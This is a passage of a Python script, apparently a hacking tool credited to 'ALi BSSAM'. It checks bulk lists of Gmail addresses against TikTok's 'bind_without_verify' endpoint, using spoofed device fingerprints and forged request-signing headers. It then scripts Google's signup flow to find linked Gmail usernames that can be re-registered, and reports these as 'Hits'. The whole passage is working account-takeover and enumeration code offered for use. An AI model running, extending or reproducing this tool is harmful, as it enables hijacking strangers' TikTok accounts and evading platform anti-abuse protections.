        params={'_rticket':_rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','fixed_mix_mode':'1','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','mix_mode':'1','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','region':'IQ','request_tag_from':'h5','resolution':'720%2A1280','rrb':'%7B%7D','scene':'4','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163105','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
        device_type = params["device_type"]
        app_name = "com.zhiliaoapp.musically"
        app_version = f"{random.randint(2000000000, 3000000000)}"
        platform = "Linux"
        os = f"Android {random.randint(10, 15)}"
        locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
        locale = random.choice(locales)
        device_types = ["phone", "tablet", "tv"]
        device_type = random.choice(device_types)
        build = f"UP1A.{random.randint(200000000, 300000000)}"
        cronet_version = f"{random.randint(10000000, 20000000)}"
        cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        quic_version = f"{random.randint(10000000, 20000000)}"
        quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        user_agent = (f"{app_name}/{app_version} ({platform}; U; {os}; {locale}; {device_type}; "
                    f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                    f"QuicVersion:{quic_version} {quic_date})")

        m=self. signn(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        headers = {
        'User-Agent': user_agent,
        'x-tt-passport-csrf-token': self. secret,
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-argus': m["x-argus"],
        'x-gorgon': m["x-gorgon"],
        'x-khronos': m["x-khronos"],
        'x-ladon': m["x-ladon"]
        }
        try:
            url="https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&"
            res = requests. post(url, params=params, headers=headers,data={"email":email},cookies=cookies).text
            
            if 'Email is linked to another account. Unlink or try another email.'in res:
                if "@gmail.com"in email:
                    self.gt+=1
                    sys.stdout.write(f"\r[Dev: ALi BSSAM] Checking: {email} | Hits : {M}{self.ge} | False: {M}{self.bt} | No: {M}{self.be}")
                    sys.stdout.flush() 
                    self.check_email(email)         

            else:
                if "@gmail.com"in email:          
                    self.bt+=1
                    sys.stdout.write(f"\r[Dev: ALi BSSAM] Checking: {email} | Hits : {M}{self.ge} | False: {M}{self.bt} | No: {M}{self.be}")
                    sys.stdout.flush()         
        except Exception as e:
            sys.stdout.write(f"\r[Dev: ALi BSSAM] Error with {email}: {e}")
            sys.stdout.flush()

    def country_code_to_flag(self , code):
        if len(code) != 2:
            return "N/L"
        return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)
    def check_email(self,email):
        original_email = email # Store the original email for printing
        if '@' in email: email=email.split('@')[0]
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://accounts.google.com/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-browser-channel': 'stable',
                'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
                'x-browser-year': '2024',
            }

            params = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '1',
                'emr': '1',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
                'followup': 'https://mail.google.com/mail/u/0/',
                'osid': '1',
                'service': 'mail',
            }

            r = self.ses.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
            tl=r.url.split('TL=')[1]
            s1= r.text.split('"Qzxixc":"')[1].split('"')[0]
            at = r.text.split('"SNlM0e":"')[1].split('"')[0]
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }

            params = {
                'rpcids': 'E815hb',
                'source-path': '/lifecycle/steps/signup/name',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }

            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.name,at)

            r = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
            ).text



            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }

            params = {
                'rpcids': 'eOY7Bb',
                'source-path': '/lifecycle/steps/signup/birthdaygender',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.birthday[0],self.birthday[1],self.birthday[2],at)
            r = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
            ).text
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["'+s1+'"]',
                'x-same-domain': '1',
            }
            params = {
                'rpcids': 'NHJMOd',
                'source-path': '/lifecycle/steps/signup/username',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
            r = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
            ).text
            if 'steps/signup/password'in r:
                self.ge+=1
                full_email = email + "@gmail.com" # Reconstruct the full email
                self.domin = full_email.split("@")[1]
                sys.stdout.write(f"\r[Dev: ALi BSSAM] {F}Hit{M}: {full_email} | Hits : {M}{self.ge} | False: {M}{self.bt} | No: {M}{self.be}")
                sys.stdout.flush() 
                self.info(full_email)         

            else:
                self.be+=1
                sys.stdout.write(f"\r[Dev: ALi BSSAM] {X}No{M}: {original_email} | Hits : {M}{self.ge} | False: {M}{self.bt} | No: {M}{self.be}")
                sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"\r[Dev: ALi BSSAM] {E}Error{M} checking {original_email}: {e}")
            sys.stdout.flush()
    

    def admin_gmail(self):
        try:
            file = open(self.file,'r').read().splitlines()
        except:
            os.system('cls')
            print(S+"السته غير موجوده  ! " )
            exit()
        with F300(max_workers=self.max) as executor:
            futures = [executor.submit(self.API_CH, user+"@gmail.com") for user in file]
            for future in futures:
                future.result()
HSO()